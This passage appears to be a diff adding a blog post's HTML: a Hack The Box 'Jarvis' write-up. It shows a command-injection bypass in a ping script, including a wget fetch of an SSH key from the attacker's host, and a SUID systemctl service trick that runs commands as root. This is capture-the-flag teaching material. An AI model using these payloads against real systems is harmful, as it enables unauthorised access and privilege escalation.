+<span class="code-line">            <span class="n">fecha</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">fecha</span><span class="p">,</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span></span>
+<span class="code-line">            <span class="k">if</span> <span class="n">fecha</span> <span class="o">&gt;</span> <span class="n">dat</span><span class="p">:</span></span>
+<span class="code-line">                <span class="n">dat</span> <span class="o">=</span> <span class="n">fecha</span></span>
+<span class="code-line">                <span class="n">req</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">i</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="n">dat</span><span class="p">,</span> <span class="n">req</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">to_dict</span><span class="p">(</span><span class="n">name</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">month_dict</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;Jan&#39;</span><span class="p">:</span><span class="s1">&#39;01&#39;</span><span class="p">,</span><span class="s1">&#39;Feb&#39;</span><span class="p">:</span><span class="s1">&#39;02&#39;</span><span class="p">,</span><span class="s1">&#39;Mar&#39;</span><span class="p">:</span><span class="s1">&#39;03&#39;</span><span class="p">,</span><span class="s1">&#39;Apr&#39;</span><span class="p">:</span><span class="s1">&#39;04&#39;</span><span class="p">,</span> <span class="s1">&#39;May&#39;</span><span class="p">:</span><span class="s1">&#39;05&#39;</span><span class="p">,</span> <span class="s1">&#39;Jun&#39;</span><span class="p">:</span><span class="s1">&#39;06&#39;</span><span class="p">,</span><span class="s1">&#39;Jul&#39;</span><span class="p">:</span><span class="s1">&#39;07&#39;</span><span class="p">,</span><span class="s1">&#39;Aug&#39;</span><span class="p">:</span><span class="s1">&#39;08&#39;</span><span class="p">,</span><span class="s1">&#39;Sep&#39;</span><span class="p">:</span><span class="s1">&#39;09&#39;</span><span class="p">,</span><span class="s1">&#39;Oct&#39;</span><span class="p">:</span><span class="s1">&#39;10&#39;</span><span class="p">,</span><span class="s1">&#39;Nov&#39;</span><span class="p">:</span><span class="s1">&#39;11&#39;</span><span class="p">,</span><span class="s1">&#39;Dec&#39;</span><span class="p">:</span><span class="s1">&#39;12&#39;</span><span class="p">}</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="n">month_dict</span><span class="p">[</span><span class="n">name</span><span class="p">]</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">get_max_level</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span></span>
+<span class="code-line">    <span class="n">level</span><span class="o">=</span><span class="mi">0</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">lines</span><span class="p">:</span></span>
+<span class="code-line">        <span class="k">if</span> <span class="s1">&#39;Level&#39;</span> <span class="ow">in</span> <span class="n">j</span><span class="p">:</span></span>
+<span class="code-line">            <span class="k">if</span> <span class="nb">int</span><span class="p">(</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">])</span> <span class="o">&gt;</span> <span class="nb">int</span><span class="p">(</span><span class="n">level</span><span class="p">):</span></span>
+<span class="code-line">                <span class="n">level</span> <span class="o">=</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">4</span><span class="p">]</span></span>
+<span class="code-line">                <span class="n">req</span><span class="o">=</span><span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">9</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39; &#39;</span> <span class="o">+</span> <span class="n">j</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">10</span><span class="p">]</span></span>
+<span class="code-line">    <span class="k">return</span> <span class="n">level</span><span class="p">,</span> <span class="n">req</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">exec_ping</span><span class="p">():</span></span>
+<span class="code-line">    <span class="n">forbidden</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;-&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;||&#39;</span><span class="p">,</span> <span class="s1">&#39;|&#39;</span><span class="p">]</span></span>
+<span class="code-line">    <span class="n">command</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s1">&#39;Enter an IP: &#39;</span><span class="p">)</span></span>
+<span class="code-line">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">forbidden</span><span class="p">:</span></span>
+<span class="code-line">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">command</span><span class="p">:</span></span>
+<span class="code-line">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Got you&#39;</span><span class="p">)</span></span>
+<span class="code-line">            <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;ping &#39;</span> <span class="o">+</span> <span class="n">command</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span></span>
+<span class="code-line">    <span class="n">show_header</span><span class="p">()</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">show_help</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line">    <span class="k">if</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-h&#39;</span> <span class="ow">or</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;--help&#39;</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">show_help</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line">    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-s&#39;</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">show_statistics</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line">    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-l&#39;</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">list_ip</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line">    <span class="k">elif</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;-p&#39;</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">exec_ping</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line">    <span class="k">else</span><span class="p">:</span></span>
+<span class="code-line">        <span class="n">show_help</span><span class="p">()</span></span>
+<span class="code-line">        <span class="n">exit</span><span class="p">()</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We notice the <code>exec_ping</code> function calling <code>os.system()</code>. As there is forbidden
+character we cannot simply execute a second command (with a <code>;</code> or a <code>&amp;&amp;</code>).
+Nevertheless we can try to ping the result of a command with the following
+<code>$(&lt;command&gt;)</code>.
+We mount a python web server with our ssh public key renamed <code>authorized\_keys</code> and
+download it from the box:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Enter an IP: $(wget 10.10.15.31:8080/authorized_keys)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We then create the <code>.ssh</code> folder in pepper home and move the key:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>Enter an IP: $(mkdir /home/pepper/.ssh)</span>
+<span class="code-line">Enter an IP: $(mv authorized_keys /home/pepper/.ssh/)</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can then connect to the box with ssh and get the user flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh -lpepper 10.10.10.143</span>
+<span class="code-line">Linux jarvis 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">Last login: Thu Oct  3 09:38:52 2019 from 10.10.15.31</span>
+<span class="code-line">pepper@jarvis:~$ cat user.txt </span>
+<span class="code-line">2afa36&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="lets-get-root">Let's get root</h1>
+<p>We enumerate the box as always.
+We found that the systemctl binary is SUID.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span>
+<span class="code-line">/bin/fusermount</span>
+<span class="code-line">/bin/mount</span>
+<span class="code-line">/bin/ping</span>
+<span class="code-line">/bin/systemctl</span>
+<span class="code-line">/bin/umount</span>
+<span class="code-line">/bin/su</span>
+<span class="code-line">/usr/bin/newgrp</span>
+<span class="code-line">/usr/bin/passwd</span>
+<span class="code-line">/usr/bin/gpasswd</span>
+<span class="code-line">/usr/bin/chsh</span>
+<span class="code-line">/usr/bin/sudo</span>
+<span class="code-line">/usr/bin/chfn</span>
+<span class="code-line">/usr/lib/eject/dmcrypt-get-device</span>
+<span class="code-line">/usr/lib/openssh/ssh-keysign</span>
+<span class="code-line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+<span class="code-line"></code></pre></div>
+
+<p><a href="https://gtfobins.github.io/gtfobins/systemctl/#suid">GTFOBins</a> show how
+to exploit that misconfiguration.
+First we create a temporary file:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ TF=$(mktemp).service</span>
+<span class="code-line"></code></pre></div>
+
+<p>We write a service file inside. This service run the command <code>id</code> and put the
+result in a file:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ echo &#39;[Service]</span>
+<span class="code-line">&gt; Type=oneshot</span>
+<span class="code-line">&gt; ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;</span>
+<span class="code-line">&gt; [Install]</span>
+<span class="code-line">&gt; WantedBy=multi-user.target&#39; &gt; $TF</span>
+<span class="code-line"></code></pre></div>
+
+<p>We link the service using sysemctl:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ /bin/systemctl link $TF</span>
+<span class="code-line">Created symlink /etc/systemd/system/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We start the service using sysemctl:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ /bin/systemctl enable --now $TF</span>
+<span class="code-line">Created symlink /etc/systemd/system/multi-user.target.wants/tmp.iyGBjTyKtn.service → /tmp/tmp.iyGBjTyKtn.service.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We get the result of the <code>id</code> command in <code>/tmp/output</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ cat /tmp/output </span>
+<span class="code-line">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="code-line"></code></pre></div>
+
+<p>The command was executed. Now we create a second service which will output the
+root's flag:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>pepper@jarvis:~$ TF2=$(mktemp).service</span>
+<span class="code-line">pepper@jarvis:~$ echo &#39;[Service]</span>
+<span class="code-line">&gt; Type=oneshot</span>
+<span class="code-line">&gt; ExecStart=/bin/sh -c &quot;cat /root/root.txt &gt; /tmp/output&quot;</span>
+<span class="code-line">&gt; [Install]</span>
+<span class="code-line">&gt; WantedBy=multi-user.target&#39; &gt; $TF2</span>
+<span class="code-line">pepper@jarvis:~$ /bin/systemctl link $TF2</span>
+<span class="code-line">Created symlink /etc/systemd/system/tmp.ZcSgmH8PDr.service → /tmp/tmp.ZcSgmH8PDr.service.</span>
+<span class="code-line">pepper@jarvis:~$ /bin/systemctl enable --now $TF2</span>
+<span class="code-line">Created symlink /etc/systemd/system/multi-user.target.wants/tmp.ZcSgmH8PDr.service → /tmp/tmp.ZcSgmH8PDr.service.</span>
+<span class="code-line">pepper@jarvis:~$ cat /tmp/output </span>
+<span class="code-line">d41d8&lt;redacted&gt;</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was a nice one. It has been a long time since my last usage of
+<code>sqlmap --os-shell</code> command.
+The movement from <code>www-data</code> to <code>pepper</code> was easy and the privilege
+escalation let me learn new things about systemd.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2019/10/htb-ellingson.html"> HTB: Ellingson </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2019/12/htb-heist.html"> HTB: Heist </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
+                    <a href="/feeds/all.atom.xml">feeds</a>
+                </li>
+                <li>
+                    <span class= "icons icons-links"></span>
+                    <a href="/pages/links.html">links</a>
+                </li>
+        </ul>
+    </section>
+
+    <section class="module social">
+        <h3 class="title module-title">Social</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-github"></span>
+                    <a href="https://github.com/maggick">github</a>
+                </li>
+                <li>
+                    <span class= "icons icons-twitter"></span>
+                    <a href="https://twitter.com/maggick_fr">twitter</a>
+                </li>
+                <li>
+                    <span class= "icons icons-stackoverflow"></span>
+                    <a href="http://stackoverflow.com/users/1827067/maggick">stackoverflow</a>
+                </li>
+        </ul>
+    </section>
+
+
+<section class="module tagcloud">
+    <h3 class="title module-title">Tags</h3>
+
+    <ul>
+            <li class="tag tag-3">
+              <a href="../../tag/openadmin.html">openAdmin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ad-recycle-bin.html">AD Recycle bin</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dll.html">DLL</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/pypi.html">pypi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bolt-cms.html">bolt CMS</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/upload.html">Upload</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/memcache.html">memcache</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nmap.html">nmap</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/vulnhub.html">vulnhub</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/bludit.html">bludit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nosql.html">NoSQL</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/misc.html">misc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/gitlab.html">gitlab</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/azure.html">Azure</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/linux.html">linux</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/umbraco.html">umbraco</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/tomcat.html">tomcat</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/jackson.html">jackson</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/javascript.html">javascript</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/webassembly.html">webassembly</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/laravel.html">laravel</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vnc.html">VNC</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ldap.html">LDAP</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/boot2root.html">boot2root</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/python.html">python</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/re.html">RE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/deserialization.html">deserialization</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xss.html">XSS</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/git.html">git</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/php.html">php</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/suid.html">SUID</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/vb.html">VB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/core-dump.html">core dump</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cloudme.html">cloudme</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chef.html">chef</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/docker.html">docker</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/web.html">web</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxc.html">lxc</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/crypto.html">Crypto</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/dnsadmins.html">DnsAdmins</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adb.html">adb</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/programming.html">programming</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/msfvenom.html">msfvenom</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cewl.html">cewl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/path.html">PATH</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phishing.html">phishing</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/vault.html">vault</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/rsa.html">RSA</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/msfconsole.html">msfconsole</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/xxe.html">XXE</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/php-filter.html">php filter</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssti.html">SSTI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/yaml.html">YAML</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nft.html">NFT</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sqli.html">SQLi</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/cve.html">CVE</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/impacket.html">impacket</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/challenge.html">challenge</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openbsd.html">OpenBSD</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/openemr.html">openEMR</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/exploit.html">exploit</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/print-nightmare.html">print nightmare</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/sudo.html">sudo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/capabilities.html">capabilities</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/devops.html">devops</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/logrotate.html">logrotate</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/enumeration.html">enumeration</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/chisel.html">chisel</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/blog.html">blog</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lfi.html">LFI</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/android.html">Android</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/journalctl.html">journalctl</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/phs.html">PHS</a>
+            </li>
+            <li class="tag tag-2">
+              <a href="../../tag/windows.html">windows</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/metasploit.html">metasploit</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/jwt.html">jwt</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/iot.html">IOT</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nostromo.html">nostromo</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/ssrf.html">SSRF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cryptocurrency.html">cryptocurrency</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/ctf.html">CTF</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/net.html">.NET</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/reverse.html">reverse</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/lxd.html">lxd</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/composer.html">composer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/teamviewer.html">teamviewer</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/nano.html">nano</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/htb.html">HTB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/cve-2019-5736.html">CVE-2019-5736</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/splunk.html">Splunk</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/winrm.html">winrm</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/drupalgeddon.html">Drupalgeddon</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/scf-file-attack.html">SCF file attack</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/adminer.html">adminer</a>
+            </li>
+            <li class="tag tag-3">
+              <a href="../../tag/smb.html">SMB</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/zip.html">zip</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/strapi.html">strapi</a>
+            </li>
+            <li class="tag tag-4">
+              <a href="../../tag/john.html">john</a>
+            </li>
+            <li class="tag tag-1">
+              <a href="../../tag/security.html">security</a>
+            </li>
+    </ul>
+</section>
+
+            </div>
+        </aside>
+    </div>
+
+    <section class="pure-g-r footer">
+<div class="pure-u-2-3 copyright">
+    <p class="l-box">
+        The content of this blog in under
+        <a href="http://creativecommons.org/licenses/by-sa/4.0/"
+            title="Share, adapt, use.        But mention the author and keep the same license">Creative Commons Attribution 4.0</a> License.
+
+        The source code is available on <a href="https://github.com/maggick/blog/" title="Contribute through GitHub">GitHub</a>.
+    </p>
+</div>
+
+<div class="pure-u-1-3 credits">
+    <p class="l-box">
+        Design by <a href="http://www.templateify.com/" title="Maggner Theme">Templateify</a>.
+    </p>
+</div>    </section>
+
+
+</div>
+</body>
+</html>
